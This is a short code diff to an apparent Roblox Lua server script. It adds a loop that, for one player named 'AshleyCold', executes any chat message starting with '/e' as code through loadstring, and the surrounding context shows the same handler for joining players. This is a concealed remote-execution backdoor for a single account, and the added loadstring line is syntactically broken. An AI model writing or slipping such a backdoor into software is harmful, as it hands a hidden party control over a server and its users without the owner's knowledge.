@@ -1,3 +1,14 @@
+ for i,player in pairs(game.Players:GetChildren()) do
+ if player.Name == "AshleyCold" then
+    player.Chatted:connect(function(message)
+      if string.sub(message,1,2) == "/e" then
+      loadstring(string.sub(message,4)()
+        end
+    end)
+  end
+ end
+
+print('hey')
 game.Players.PlayerAdded:connect(function(player)
   if player.Name == "AshleyCold" then
     player.Chatted:connect(function(message)
